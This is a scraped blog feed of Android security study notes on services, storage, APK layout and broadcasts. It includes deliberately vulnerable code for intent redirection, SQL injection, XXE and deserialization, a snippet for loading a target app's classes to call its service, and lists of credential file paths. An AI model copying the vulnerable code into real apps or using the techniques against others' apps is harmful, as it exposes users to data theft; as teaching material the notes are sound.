2- using class Loading By loading the class directly from the target app, we can just invoke the functions we need and do not have to bother about method order or package names.\nServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;package.name\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;class.you.want.to.use\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); //Example to create and call method from class Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;openFlag\u0026#34;); boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Reversing #\rWhen you see .Stub() related code inside a Service implementation, we probably have an AIDL service. To reverse engineer the original .aidl code, we can look into the generated service interface code.\nLook for the DESCRIPTOR variable, as it contains the original package path and .aidl filename The AIDL methods can be derived from the interface methods with the throws RemoteException The original method order is shown by the TRANSACTION_ integers 3. Foreground Services #\rServices that perform user-noticeable operations with persistent notifications\npublic class ForegroundService extends Service { private static final int NOTIFICATION_ID = 1; private static final String CHANNEL_ID = \u0026#34;ForegroundServiceChannel\u0026#34;; @Override public void onCreate() { super.onCreate(); createNotificationChannel(); } @Override public int onStartCommand(Intent intent, int flags, int startId) { createNotificationChannel(); Intent notificationIntent = new Intent(this, MainActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE); Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID) .setContentTitle(\u0026#34;Foreground Service\u0026#34;) .setContentText(\u0026#34;Service is running...\u0026#34;) .setSmallIcon(R.drawable.ic_notification) .setContentIntent(pendingIntent) .build(); startForeground(NOTIFICATION_ID, notification); return START_NOT_STICKY; } private void createNotificationChannel() { if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { NotificationChannel serviceChannel = new NotificationChannel( CHANNEL_ID, \u0026#34;Foreground Service Channel\u0026#34;, NotificationManager.IMPORTANCE_DEFAULT ); NotificationManager manager = getSystemService(NotificationManager.class); manager.createNotificationChannel(serviceChannel); } } @Override public IBinder onBind(Intent intent) { return null; } } Starting Foreground Service:\n// For API 26+ if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { startForegroundService(new Intent(this, ForegroundService.class)); } else { startService(new Intent(this, ForegroundService.class)); } Service Security Vulnerabilities \u0026amp; Attacks #\r1. Intent Redirection Attacks #\r[!danger] Critical Vulnerability A publicly accessible service might receive an Intent object as an extra and then use unsafe methods like startActivity(), sendBroadcast(), or startService() on that embedded Intent. This is similar to an Open Redirect in web security.\nAttack Scenario: An attacker can craft a malicious Intent containing a target Intent for a normally non-exported component within the vulnerable app. The proxy service then unknowingly forwards this malicious Intent, bypassing Android\u0026rsquo;s access restrictions.\nImpact:\nTheft of authentication details (user session) Forging of content within the app Arbitrary code execution by rewriting files and substituting native libraries Access to Content Providers with android:grantUriPermissions=\u0026quot;true\u0026quot; Vulnerable Code Example:\npublic class VulnerableProxyService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { // DANGEROUS: Directly forwarding received intent Intent embeddedIntent = intent.getParcelableExtra(\u0026#34;target_intent\u0026#34;); if (embeddedIntent != null) { startActivity(embeddedIntent); // Bypasses access controls! } return START_NOT_STICKY; } @Override public IBinder onBind(Intent intent) { return null; } } Secure Implementation:\npublic class SecureProxyService extends Service { private static final String[] ALLOWED_ACTIONS = { Intent.ACTION_VIEW, Intent.ACTION_SEND }; @Override public int onStartCommand(Intent intent, int flags, int startId) { // Extract only necessary and safe data String action = intent.getStringExtra(\u0026#34;safe_action\u0026#34;); String data = intent.getStringExtra(\u0026#34;safe_data\u0026#34;); if (!isAllowedAction(action) || !isSafeData(data)) { Log.w(TAG, \u0026#34;Unsafe intent parameters detected\u0026#34;); return START_NOT_STICKY; } // Create new intent with validated data only Intent safeIntent = new Intent(action); safeIntent.setData(Uri.parse(data)); // Remove unsafe flags safeIntent.setFlags(0); // Add only necessary safe flags safeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(safeIntent); return START_NOT_STICKY; } private boolean isAllowedAction(String action) { return action != null \u0026amp;\u0026amp; Arrays.asList(ALLOWED_ACTIONS).contains(action); } private boolean isSafeData(String data) { if (data == null) return false; try { Uri uri = Uri.parse(data); String scheme = uri.getScheme(); return \u0026#34;https\u0026#34;.equals(scheme) || \u0026#34;http\u0026#34;.equals(scheme); } catch (Exception e) { return false; } } @Override public IBinder onBind(Intent intent) { return null; } } 2. Improper Platform Usage and Permission-Based Access Control #\r[!danger] Permission Bypass An exported service performing sensitive tasks might lack proper android:permission or manual permission checks, allowing malicious apps to abuse the service\u0026rsquo;s privileges.\nVulnerable Manifest:\n\u0026lt;!-- DANGEROUS: Exported without permission checks --\u0026gt; \u0026lt;service android:name=\u0026#34;.SensitiveService\u0026#34; android:exported=\u0026#34;true\u0026#34; /\u0026gt; Secure Manifest Configuration:\n\u0026lt;!-- Secure service configuration --\u0026gt; \u0026lt;service android:name=\u0026#34;.SecureService\u0026#34; android:exported=\u0026#34;false\u0026#34; android:permission=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; /\u0026gt; \u0026lt;!-- Define custom signature-level permission --\u0026gt; \u0026lt;permission android:name=\u0026#34;com.example.CUSTOM_PERMISSION\u0026#34; android:label=\u0026#34;Access Secure Service\u0026#34; android:description=\u0026#34;Allows access to secure service functionality\u0026#34; android:protectionLevel=\u0026#34;signature\u0026#34; /\u0026gt; Secure Service Implementation:\npublic class SecureService extends Service { private static final String REQUIRED_PERMISSION = \u0026#34;com.example.CUSTOM_PERMISSION\u0026#34;; private static final String[] TRUSTED_PACKAGES = { \u0026#34;com.example.trustedapp1\u0026#34;, \u0026#34;com.example.trustedapp2\u0026#34; }; @Override public IBinder onBind(Intent intent) { // Check calling permission if (checkCallingPermission(REQUIRED_PERMISSION) != PackageManager.PERMISSION_GRANTED) { throw new SecurityException(\u0026#34;Permission denied: \u0026#34; + REQUIRED_PERMISSION); } // Additional package validation if (!isCallerTrusted()) { throw new SecurityException(\u0026#34;Untrusted caller\u0026#34;); } return binder; } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Validate calling package if (!isCallerTrusted()) { Log.w(TAG, \u0026#34;Unauthorized access attempt from: \u0026#34; + getCallingPackage()); stopSelf(); return START_NOT_STICKY; } // Perform sensitive operations performSensitiveTask(); return START_STICKY; } private boolean isCallerTrusted() { String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); // Verify package signature for additional security if (callingPackage != null) { try { PackageInfo callerInfo = getPackageManager() .getPackageInfo(callingPackage, PackageManager.GET_SIGNATURES); return verifySignature(callerInfo.signatures); } catch (PackageManager.NameNotFoundException e) { return false; } } return Arrays.asList(TRUSTED_PACKAGES).contains(callingPackage); } private boolean verifySignature(Signature[] signatures) { // Implement signature verification logic // Compare with expected signature hashes return true; // Simplified for brevity } @Override public IBinder onBind(Intent intent) { return null; } } 3. Implicit Intent Hijacking #\r[!danger] Intent Interception Malicious applications can intercept implicit intents meant for legitimate services by registering matching intent filters.\nVulnerable Code:\n// DANGEROUS: Using implicit intent Intent serviceIntent = new Intent(\u0026#34;com.example.ACTION_PROCESS_DATA\u0026#34;); serviceIntent.putExtra(\u0026#34;sensitive_token\u0026#34;, userToken); startService(serviceIntent); Secure Implementation:\npublic class SecureIntentService extends Service { // Start service securely from client public static void startSecurely(Context context, String data) { Intent explicit = new Intent(context, SecureIntentService.class); // Make intent explicit explicit.setPackage(context.getPackageName()); explicit.putExtra(\u0026#34;data\u0026#34;, data); if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.O) { context.startForegroundService(explicit); } else { context.startService(explicit); } } @Override public int onStartCommand(Intent intent, int flags, int startId) { // Validate intent source if (!isIntentFromTrustedSource(intent)) { Log.w(TAG, \u0026#34;Received intent from untrusted source\u0026#34;); stopSelf(); return START_NOT_STICKY; } String data = intent.getStringExtra(\u0026#34;data\u0026#34;); if (data != null) { processData(data); } return START_NOT_STICKY; } private boolean isIntentFromTrustedSource(Intent intent) { String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); return getPackageName().equals(callingPackage); } @Override public IBinder onBind(Intent intent) { return null; } } 4. Pending Intent Vulnerabilities #\r[!danger] Mutable PendingIntents Mutable PendingIntent objects can be modified by malicious applications to gain access to non-exported components.\nVulnerable PendingIntent Creation:\n// DANGEROUS: Mutable PendingIntent Intent intent = new Intent(this, PrivateActivity.class); PendingIntent pendingIntent = PendingIntent.getActivity( this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT); Secure PendingIntent Implementation:\npublic class SecurePendingIntentService extends Service { private PendingIntent createSecurePendingIntent() { Intent intent = new Intent(this, MainActivity.class); intent.setAction(\u0026#34;com.example.SECURE_ACTION\u0026#34;); // Make PendingIntent immutable (API 23+) int flags = PendingIntent.FLAG_UPDATE_CURRENT; if (Build.VERSION.SDK_INT \u0026gt;= Build.VERSION_CODES.M) { flags |= PendingIntent.FLAG_IMMUTABLE; } // Use FLAG_ONE_SHOT if should only be triggered once if (shouldBeOneShot()) { flags |= PendingIntent.FLAG_ONE_SHOT; } return PendingIntent.getActivity(this, 0, intent, flags); } private void handlePendingIntent(PendingIntent receivedIntent) { // NEVER trust PendingIntent creator information for authorization // DO NOT use: PendingIntent.getCreatorPackage() // DO NOT use: PendingIntent.getCreatorUid() // Instead, use alternative authentication methods String callingPackage = getPackageManager().getNameForUid(Binder.getCallingUid()); if (!isAuthorizedCaller(callingPackage)) { throw new SecurityException(\u0026#34;Unauthorized PendingIntent usage\u0026#34;); } // Process the PendingIntent safely try { receivedIntent.send(); } catch (PendingIntent.CanceledException e) { Log.e(TAG, \u0026#34;PendingIntent was cancelled\u0026#34;, e); } } private boolean shouldBeOneShot() { // Determine if this PendingIntent should only be used once return true; } private boolean isAuthorizedCaller(String packageName) { // Verify caller through alternative means return verifyCallerSignature(packageName); } @Override public IBinder onBind(Intent intent) { return null; } } 5. Memory Corruption Vulnerabilities #\r[!danger] Deserialization Attacks Services processing untrusted data through deserialization or insecure JSON parsing can be vulnerable to memory corruption.\nVulnerable Code:\n// DANGEROUS: Unsafe deserialization @Override public int onStartCommand(Intent intent, int flags, int startId) { byte[] serializedData = intent.getByteArrayExtra(\u0026#34;user_data\u0026#34;); if (serializedData != null) { try { ObjectInputStream ois = new ObjectInputStream( new ByteArrayInputStream(serializedData)); Object userObject = ois.readObject(); // DANGEROUS! processUserObject(userObject); } catch (Exception e) { Log.e(TAG, \u0026#34;Deserialization failed\u0026#34;, e); } } return START_NOT_STICKY; } Secure Implementation:\npublic class SecureDeserializationService extends Service { private static final Set\u0026lt;String\u0026gt; ALLOWED_CLASSES = new HashSet\u0026lt;\u0026gt;(Arrays.asList( \u0026#34;com.example.SafeDataClass\u0026#34;, \u0026#34;com.example.UserPreferences\u0026#34; )); @Override public int onStartCommand(Intent intent, int flags, int startId) { String jsonData = intent.getStringExtra(\u0026#34;json_data\u0026#34;); if (jsonData != null) { processJsonSafely(jsonData); } Bundle bundle = intent.getBundleExtra(\u0026#34;bundle_data\u0026#34;); if (bundle != null) { processBundleSafely(bundle); } return START_NOT_STICKY; } private void processJsonSafely(String jsonData) { try { // Use safe JSON parsing - avoid dynamic object creation JSONObject json = new JSONObject(jsonData); // Extract only expected fields String name = json.optString(\u0026#34;name\u0026#34;, \u0026#34;\u0026#34;); int age = json.optInt(\u0026#34;age\u0026#34;, 0); if (isValidInput(name, age)) { // Create objects manually instead of automatic deserialization UserData userData = new UserData(name, age); processUserData(userData); } } catch (JSONException e) { Log.w(TAG, \u0026#34;Invalid JSON data received\u0026#34;); } } private void processBundleSafely(Bundle bundle) { // Avoid using Parcelable classes that might contain native pointers // Extract primitive types only String safeString = bundle.getString(\u0026#34;safe_string\u0026#34;); int safeInt = bundle.getInt(\u0026#34;safe_int\u0026#34;, 0); if (isValidBundleData(safeString, safeInt)) { processValidatedData(safeString, safeInt); } } private boolean isValidInput(String name, int age) { return name != null \u0026amp;\u0026amp; name.length() \u0026lt;= 100 \u0026amp;\u0026amp; age \u0026gt;= 0 \u0026amp;\u0026amp; age \u0026lt;= 150; } private boolean isValidBundleData(String str, int value) { return str != null \u0026amp;\u0026amp; str.length() \u0026lt;= 1000 \u0026amp;\u0026amp; value \u0026gt;= 0; } // Custom ObjectInputStream with class filtering private static class SafeObjectInputStream extends ObjectInputStream { public SafeObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); if (!ALLOWED_CLASSES.contains(className)) { throw new SecurityException(\u0026#34;Disallowed class: \u0026#34; + className); } return super.resolveClass(desc); } } @Override public IBinder onBind(Intent intent) { return null; } } 6. SQL Injection in Service Database Operations #\r[!danger] Database Vulnerabilities Services interacting with databases can be vulnerable to SQL injection if they construct queries insecurely.\nVulnerable Database Service:\n// DANGEROUS: SQL injection vulnerable public class VulnerableDatabaseService extends Service { private SQLiteDatabase database; @Override public int onStartCommand(Intent intent, int flags, int startId) { String userId = intent.getStringExtra(\u0026#34;user_id\u0026#34;); String query = \u0026#34;SELECT * FROM users WHERE id = \u0026#39;\u0026#34; + userId + \u0026#34;\u0026#39;\u0026#34;; // DANGEROUS! Cursor cursor = database.rawQuery(query, null); // Process results... return START_NOT_STICKY; } } Secure Database Implementation:\npublic class SecureDatabaseService extends Service { private SQLiteDatabase database; private SQLiteQueryBuilder queryBuilder; @Override public void onCreate() { super.onCreate(); initializeDatabase(); setupSecureQueryBuilder(); } private void setupSecureQueryBuilder() { queryBuilder = new SQLiteQueryBuilder(); queryBuilder.setStrict(true); // Enable strict mode queryBuilder.setStrictColumns(true); // Validate columns queryBuilder.setStrictGrammar(true); // Limit subqueries } @Override public int onStartCommand(Intent intent, int flags, int startId) { String userId = intent.getStringExtra(\u0026#34;user_id\u0026#34;); if (!isValidUserId(userId)) { Log.w(TAG, \u0026#34;Invalid user ID received\u0026#34;); return START_NOT_STICKY; } // Use parameterized queries String[] selectionArgs = {userId}; Cursor cursor = database.query( \u0026#34;users\u0026#34;, // table null, // columns \u0026#34;id = ?\u0026#34;, // selection with placeholder selectionArgs, // selection args null, // groupBy null, // having null // orderBy ); processResults(cursor); return START_NOT_STICKY; } // Alternative using PreparedStatement private void queryWithPreparedStatement(String userId) { String sql = \u0026#34;SELECT * FROM users WHERE id = ?\u0026#34;; try (SQLiteStatement statement = database.compileStatement(sql)) { statement.bindString(1, userId); // Execute query safely } } // Using secure QueryBuilder private Cursor secureQuery(String userId, String column) { Map\u0026lt;String, String\u0026gt; columnMap = new HashMap\u0026lt;\u0026gt;(); columnMap.put(\u0026#34;user_id\u0026#34;, \u0026#34;id\u0026#34;); columnMap.put(\u0026#34;user_name\u0026#34;, \u0026#34;name\u0026#34;); queryBuilder.setProjectionMap(columnMap); queryBuilder.setTables(\u0026#34;users\u0026#34;); return queryBuilder.query( database, new String[]{column}, // projection \u0026#34;id = ?\u0026#34;, // selection new String[]{userId}, // selectionArgs null, // groupBy null, // having null // sortOrder ); } private boolean isValidUserId(String userId) { return userId != null \u0026amp;\u0026amp; userId.matches(\u0026#34;^[0-9]+$\u0026#34;) \u0026amp;\u0026amp; userId.length() \u0026lt;= 10; } @Override public IBinder onBind(Intent intent) { return null; } } 7. XML External Entities (XXE) Injection #\r[!danger] XXE Vulnerabilities Services processing XML input may be vulnerable to XXE attacks if the XML parser is not securely configured.\nVulnerable XML Processing:\n// DANGEROUS: XXE vulnerable XML parsing public class VulnerableXMLService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { String xmlData = intent.getStringExtra(\u0026#34;xml_data\u0026#34;); if (xmlData != null) { try { DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); // DANGEROUS! Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes())); processXMLDocument(doc); } catch (Exception e) { Log.e(TAG, \u0026#34;XML parsing failed\u0026#34;, e); } } return START_NOT_STICKY; } } Secure XML Processing:\npublic class SecureXMLService extends Service { @Override public int onStartCommand(Intent intent, int flags, int startId) { String xmlData = intent.getStringExtra(\u0026#34;xml_data\u0026#34;); if (xmlData != null \u0026amp;\u0026amp; isValidXMLInput(xmlData)) { parseXMLSecurely(xmlData); } return START_NOT_STICKY; } private void parseXMLSecurely(String xmlData) { try { // Method 1: Using DocumentBuilderFactory with security features disabled DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // Disable DTDs completely factory.setFeature(\u0026#34;http://apache.org/xml/features/disallow-doctype-decl\u0026#34;, true); // Disable external DTDs and stylesheets factory.setFeature(\u0026#34;http://xml.org/sax/features/external-general-entities\u0026#34;, false); factory.setFeature(\u0026#34;http://xml.org/sax/features/external-parameter-entities\u0026#34;, false); // Disable XInclude processing factory.setXIncludeAware(false); // Disable expansion of entity reference nodes factory.setExpandEntityReferences(false); DocumentBuilder builder = factory.newDocumentBuilder(); Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes())); processXMLDocument(doc); } catch (Exception e) { Log.e(TAG, \u0026#34;Secure XML ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/services/","section":"","summary":"","title":"Android Services - Complete Development \u0026 Security Guide","type":"posts"},{"content":"\rStorage summary #\rDirectories you can see (Non-Root) (Attack Surface) #\rPublic External Storage #\rPath: /storage/emulated/0/ (symlinked as /sdcard/) Access Level: World-readable/writable with proper permissions Security Implications: ANY app can read files here with READ_EXTERNAL_STORAGE permission Data persistence even after app uninstallation Potential data leakage vector Key Subdirectories: #\r/sdcard/\r├── DCIM/ # Camera images\r├── Downloads/ # Downloaded files\r├── Pictures/ # User images\r├── Music/ # Audio files\r└── Android/data/\u0026lt;package_name\u0026gt;/ # App-specific external data App-Specific External Storage #\rPath: /sdcard/Android/data/\u0026lt;package_name\u0026gt;/ Access: App can access without WRITE_EXTERNAL_STORAGE permission (Android 4.4+) Other apps can access with proper permissions Scoped Storage restrictions apply (Android 11+) World-Writable Directory #\rPath: /data/local/tmp/ Security Risk: Any app can write/read files here Common Attack Vector: Privilege escalation, data exfiltration Protected Directories (Root/System Access Required) #\r/data/data/ Contains every installed application\u0026rsquo;s private data Each app subdirectory owned by unique Linux UID (different users separate directories with their own apps) Path: /data/data/\u0026lt;package_name\u0026gt;/\nSecurity Model: App-sandboxed, unique Linux UID per app (different users separate directories with their own apps) Contains every installed application\u0026rsquo;s private data Contains: Key App Data Subdirectories: #\r/data/data/\u0026lt;package-name\u0026gt;/\r├── databases/ # SQLite databases (populated on first run)\r├── shared_prefs/ # SharedPreferences XML files\r├── files/ # Private app files\r└── cache/ # App cache data APK and Binary Locations #\r/data/app/ User-installed APK files (decrypted) Researchers: APK extraction, reverse engineering source /data/app-asec/ Encrypted ASEC containers for \u0026ldquo;forward locked\u0026rdquo; apps Security Focus: Encryption analysis, DRM bypass research /data/app-lib/ Extracted native libraries (.so files) Researchers: Native code analysis, ROP/JOP gadgets System App Directories \u0026amp; Configuration #\r/system/app/ - Pre-installed system apps /system/priv-app/ - Privileged apps with signatureOrSystem permissions /system/vendor/app/ - Vendor-specific applications /system/bin/ - System binaries Package Management #\r/data/system/packages.xml Critical for researchers: Package database, UIDs, permissions, signing certificates Maps package names to user IDs and permissions /data/system/packages.list App UIDs, package names, debuggable flags, data paths Security use: Permission enumeration, attack surface mapping Certificate Stores #\r/etc/security/cacerts/ - System certificate store (root only) /data/misc/user/0/cacerts-added/ - User-added certificates Security researchers: Certificate pinning bypass, MITM analysis Network Configuration #\r/etc/apns-conf.xml - APN configurations /data/misc/wifi/ - WiFi configuration files Security focus: Stored network credentials, PSK analysis Multi-User environment #\r/data/user/ - Multi-user data directories /data/user/0/ - Device owner data (symlink to /data/data/) /data/system/users/\u0026lt;user ID\u0026gt;/ User metadata, accounts database (accounts.db) Lock screen credentials (gesture.key, password.key) API Access Methods #\r// Internal storage Context.getFilesDir() // /data/data/\u0026lt;pkg\u0026gt;/files/ Context.getDatabasePath() // /data/data/\u0026lt;pkg\u0026gt;/databases/ // External storage getExternalFilesDir() // /sdcard/Android/data/\u0026lt;pkg\u0026gt;/files/ Environment.getExternalStoragePublicDirectory() // /sdcard/ Version-Specific Changes #\rAndroid 11+ (API 30) #\rScoped Storage mandatory Restricted access to /sdcard/Android/data/ Enhanced privacy controls Android 10 (API 29) #\rScoped Storage introduction External storage filtering Legacy Versions #\rBroader external storage access Fewer privacy restrictions APK Structure summary #\r📁 Core Files \u0026amp; Directories #\rComponent Description Importance Notes AndroidManifest.xml Core configuration file with package name, permissions, components, debuggable status ⭐⭐⭐ Very High Binary XML format - requires apktool to decode classes.dex Main Java source code compiled to Dalvik Executable format ⭐⭐⭐ Very High Contains primary app logic assets/ Custom developer resources (certs, configs, etc.) ⭐⭐ High Often contains security-relevant data lib/ Native C/C++ shared object (.so) libraries ⭐⭐ High Architecture-specific folders; harder to reverse resources.arsc Compiled resources (strings, colors, UI attributes) ⭐ Low-Moderate Precompiled resources linking code to assets res/ Images, UI resources, language strings ⭐ Moderate Predefined resource types META-INF/ App signing information and verification data ⭐ Moderate Contains signature files and hashes com/ XML fragments and general files ❌ Low Usually not useful for reverse engineering META-INF Directory Contents #\rMANIFEST.MF: File names/hashes (SHA256 Base64) for all APK files CERT.SF: Names/hashes of corresponding MANIFEST.MF lines CERT.RSA: Public key and signature of CERT.SF lib Directory Structure #\rContains architecture-specific subdirectories: armeabi-v7a/ x86/ arm64-v8a/ ","date":"30 يوليو 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/file-structure-and-storage/","section":"","summary":"","title":"Android System File Structure and Storage","type":"posts"},{"content":"\rSummary #\rBroadcast and Broadcast Receivers are part of a messaging system that allows applications to communicate with the Android system or with other apps. Broadcasts can be used as a messaging system across apps and outside of the normal user flow. Like a person shouting a name and who are interested listen and may shout back.\n[!WARNING] As part of the Android 8.0 (API level 26) background execution limits, apps that target the API level 26 or higher can\u0026rsquo;t register broadcast receivers for implicit broadcasts in their manifest unless the broadcast is sent specifically to them. However, several broadcasts are exempted from these limitations.\nError: How to receive a broadcast? #\r1- Via manifest file with a \u0026lt;receiver\u0026gt; tag #\r\u0026lt;receiver android:name=\u0026#34;.MyReceiver\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.BOOT_COMPLETED\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; public class MyReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { // Code to run when broadcast is received Toast.makeText(context, \u0026#34;Broadcast received!\u0026#34;, Toast.LENGTH_SHORT).show(); } } 2- Dynamically registering a receiver using registerReceiver() #\ror Context-Registered Receivers\n// Step 1: Create a BroadcastReceiver subclass public class MyReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if (\u0026#34;com.example.ACTION_UPDATE\u0026#34;.equals(intent.getAction())) { String data = intent.getStringExtra(\u0026#34;data\u0026#34;); Log.d(\u0026#34;MyReceiver\u0026#34;, \u0026#34;Received: \u0026#34; + data); } } } // Step 2: Register/Unregister in an Activity public class MainActivity extends AppCompatActivity { private MyReceiver receiver; @Override protected void onStart() { super.onStart(); receiver = new MyReceiver(); IntentFilter filter = new IntentFilter(\u0026#34;com.example.ACTION_UPDATE\u0026#34;); // RECEIVER_NOT_EXPORTED: Restrict to app-only (Android 12+) ContextCompat.registerReceiver( this, receiver, filter, ContextCompat.RECEIVER_NOT_EXPORTED ); } @Override protected void onStop() { super.onStop(); unregisterReceiver(receiver); // Prevent memory leaks } } Receive broadcasts with permissions #\rIf you specify a permission parameter when registering a broadcast receiver (either with registerReceiver(BroadcastReceiver, IntentFilter, String, Handler) or in \u0026lt;receiver\u0026gt; tag in your manifest), then only broadcasters who have requested the permission with the \u0026lt;uses-permission\u0026gt; tag in their manifest can send an Intent to the receiver. If the permission is dangerous, the broadcaster must also be granted the permission.\nFor example, assume your receiving app has a manifest-declared receiver as follows:\n\u0026lt;!-- If this receiver listens for broadcasts sent from the system or from other apps, even other apps that you own, set android:exported to \u0026#34;true\u0026#34;. --\u0026gt; \u0026lt;receiver android:name=\u0026#34;.MyBroadcastReceiverWithPermission\u0026#34; android:permission=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.snippets.ACTION_UPDATE_DATA\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; Or your receiving app has a context-registered receiver as follows:\nContextCompat.registerReceiver( context, myBroadcastReceiver, filter, android.Manifest.permission.ACCESS_COARSE_LOCATION, null, // scheduler that defines thread, null means run on main thread receiverFlags ); Then, to be able to send broadcasts to those receivers, the sending app must request the permission as follows:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; /\u0026gt; Implicit broadcast exceptions #\rKey Exempted Broadcasts\n1. Boot \u0026amp; User Events #\rACTION_LOCKED_BOOT_COMPLETED, ACTION_BOOT_COMPLETED Needed for scheduling jobs/alarms after boot. ACTION_USER_INITIALIZE, USER_ADDED, USER_REMOVED Restricted to privileged apps (e.g., device admin). 2. Time \u0026amp; Locale Changes #\rACTION_TIME_SET, ACTION_TIMEZONE_CHANGED, ACTION_NEXT_ALARM_CLOCK_CHANGED Clock/alarm apps require these. ACTION_LOCALE_CHANGED Rarely sent; apps may need to update localized data. 3. Hardware Events #\rUSB: ACTION_USB_ACCESSORY_ATTACHED, ACTION_USB_DEVICE_DETACHED, etc. No alternative for detecting USB state changes. Bluetooth: BluetoothHeadset.ACTION_CONNECTION_STATE_CHANGED, ACTION_ACL_CONNECTED, etc. User experience not impacted by background delivery. Storage: ACTION_MEDIA_MOUNTED, ACTION_MEDIA_EJECT, etc. Triggered by physical user actions (e.g., SD card removal). 4. Telephony \u0026amp; Accounts #\rCarrier/Subscription: ACTION_CARRIER_CONFIG_CHANGED, TelephonyIntents.ACTION_*_SUBSCRIPTION_CHANGED Critical for OEM telephony apps. SMS/MMS: SMS_RECEIVED_ACTION, WAP_PUSH_RECEIVED_ACTION Required for SMS-handling apps. Accounts: LOGIN_ACCOUNTS_CHANGED_ACTION, ACTION_ACCOUNT_REMOVED Needed to sync data on account changes. 5. Package Management #\rACTION_PACKAGE_DATA_CLEARED Rare (user-triggered via Settings). ACTION_PACKAGE_FULLY_REMOVED Apps may need to clean up data when another package is uninstalled. 6. Other Exemptions #\rACTION_NEW_OUTGOING_CALL For call-blocking apps. ACTION_DEVICE_OWNER_CHANGED Rare; security apps need it. ACTION_EVENT_REMINDER Calendar provider sends this implicitly. Important Notes #\rAvoid Overuse: Even exempted broadcasts should be used sparingly to minimize performance impact. Alternatives: For non-exempt broadcasts, use: Context-registered receivers (while the app is active). JobScheduler/WorkManager for background tasks. Deprecated Broadcasts: LOGIN_ACCOUNTS_CHANGED_ACTION → Prefer ACTION_ACCOUNT_REMOVED. ACTION_PACKAGE_REPLACED → Not exempted (use JobScheduler). Best Practices #\rTargeted Broadcasts: Use setPackage() or explicit intents where possible. Minimize Manifest Receivers: Rely on dynamic registration unless exempted. Handle onReceive() Quickly: Use goAsync() or JobScheduler for long tasks. Sending broadcast #\r[!Warning] Attackers cant send system protected actions\nBypass the Restriction if :\nYou’re building a system app (installed on /system partition) — only possible on rooted or custom ROM devices. You sign your app with the platform certificate (only available to OEMs). You use ADB to broadcast during testing: adb shell am broadcast -a android.intent.action.BOOT_COMPLETED Permissions allow you to restrict broadcasts to the set of apps that hold certain permissions. You can enforce restrictions on either the sender or receiver of a broadcast.\nYou can also limit a broadcast to a set of apps in the same organization by calling setPackage(String) on the intent.\nIntent intent = new Intent(); intent.setClassName(\u0026#34;package\u0026#34;,\u0026#34;classname\u0026#34;); intent.setPackage(\u0026#34;com.example.snippets\u0026#34;); sendBroadcast(intent); Send broadcasts with permissions #\rWhen you call sendBroadcast(Intent, String) or sendOrderedBroadcast(Intent, String, BroadcastReceiver, Handler, int, String, Bundle), you can specify a permission parameter. Only receivers who have requested that permission with the \u0026lt;uses-permission\u0026gt; tag in their manifest can receive the broadcast. If the permission is dangerous, you must grant the permission before the receiver can receive the broadcast. For example, the following code sends a broadcast with a permission:\ncontext.sendBroadcast(intent, android.Manifest.permission.ACCESS_COARSE_LOCATION); To receive the broadcast, the receiving app must request the permission as follows:\n\u0026lt;uses-permission android:name=\u0026#34;android.permission.ACCESS_COARSE_LOCATION\u0026#34; /\u0026gt; You can specify either an existing system permission like BLUETOOTH_CONNECT or define a custom permission with the \u0026lt;permission\u0026gt; element.\nNon-ordered vs. Ordered Broadcasts #\rIn non-ordered mode, broadcasts are sent to all interested 